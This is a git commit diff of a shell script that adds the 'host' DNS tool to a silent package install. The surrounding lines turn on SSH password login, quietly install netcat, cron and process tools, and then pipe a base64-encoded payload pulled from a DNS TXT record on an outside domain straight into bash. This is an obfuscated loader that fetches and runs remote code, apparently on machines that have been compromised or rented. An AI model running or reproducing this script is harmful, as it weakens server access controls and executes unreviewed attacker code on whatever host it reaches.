5c7492995580ca6703fbce7ec244d3e8e82f43aa
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2025-02-28 19:57:28 +0800

    Update zh88kk2.sh

--- zh88kk2.sh
+++ zh88kk2.sh
@@ -5,5 +5,5 @@ sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/s
 sudo service sshd restart
 # Debian12+
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
-sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional >/dev/null 2>&1
+sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
 bash <(host -t txt acedu.click |cut -d'"' -f2 |base64 -d)
